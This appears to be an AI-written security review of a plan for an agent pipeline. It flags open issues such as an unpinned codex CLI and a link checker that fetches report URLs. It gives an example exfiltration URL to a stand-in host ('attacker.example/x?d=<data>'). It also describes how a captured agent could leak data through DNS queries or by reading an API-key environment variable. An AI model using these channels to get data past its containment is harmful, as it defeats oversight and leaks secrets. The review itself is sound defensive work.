# Grok 4.6 — Hostile Gate Review

**Reviewer:** OpenRouter `deepseek/deepseek-v4-flash` (effort: high)
**Document:** docs/ai-workflow/AI-HANDOFF/SWAN-OPS-PLAN-REVIEW-PACKET-R2-2026-08-22.md
**Seed:** (none)
**Tokens:** 14974 in / 5048 out · **Cost:** ~$0.0018 · **Wall:** 39.4s · **finish:** stop

---

## VERDICT
REVISE — The fix for OPEN-2 is incomplete (codex unpinned), and OPEN-11 remains active as an exfiltration vector on attended runs, rendering the freeze ineffective for that channel; the plan's deferral of OPEN-11 is not safe and must be resolved before closing this round.

## BLOCKERS
1. **P1** — OPEN-11 exfiltration via `Test-ReportLinks` still active on attended runs. A captured agent includes a URL like `https://attacker.example/x?d=<data>` in the report; the parent process fetches it after publish, exfiltrating data and enabling SSRF. The plan defers to Slice 2, but Slice 2 may never happen under retire-in-place, and attended runs are allowed today.  
   *Evidence: `lib/Console.ps1:26` (`Test-ReportLinks`), called at `Publish.ps1:481`; document §7 OPEN-11 and unchanged code.*
2. **P2** — The pin fix for OPEN-2 only pins `@playwright/mcp` while the original finding also required pinning `codex` ("Pin exact version + integrity; pin `codex` too."). The codex CLI remains floating, which can break version drift checks or introduce new behavior without notification.  
   *Evidence: `lib/BrowserPolicy.ps1` pin comment mentions only MCP; document §7 OPEN-2 notes "pin codex too".*
3. **P2** — The §14 acceptance test spec does not require blocking DNS exfiltration or environment variable reads; a captured agent could exfiltrate data via DNS queries or read `$env:ZAI_API_KEY` directly. The acceptance could pass while these exfiltration paths remain open.  
   *Evidence: Document §14 lists approval criteria but omits DNS and env-var tests.*

## ATTACKS
- **Correctness**: No new correctness defects from the fixes; the e2e freeze test and mutation appear sound.
- **Security**: OPEN-11 is a live SSRF/data-exfiltration vector because `Test-ReportLinks` runs in the parent process and is not blocked by any current control. The `$AdLibraryOrigins` overstatement (includes `https://www.google.com`) remains, misrepresenting disclosure scope. The pin fix omits codex itself, leaving a floating dependency.
- **Data‑truth / schema drift**: None observed.

## HIGHEST RISK
OPEN-11 is the single most dangerous item because it provides an immediate exfiltration channel on attended runs, which are currently permitted. The cheapest concrete de-risk: modify `Publish.ps1` to skip `Test-ReportLinks` for all reports (or only allowlist `https://www.facebook.com` and `https://adstransparency.google.com`). This is a one‑line change and does not gate on Slice 2.

## CONFIDENCE
I could not verify the mutation test result for the freeze case (no log provided), nor the actual behavior of the e2e suite on the real machine. I also could not examine the current state of `lib/Publish.ps1` to confirm the link‑checker call site. These would be settled by running the test suite and reviewing the code. The plan's claims about test coverage and pin behavior are otherwise internally consistent.

REVISE
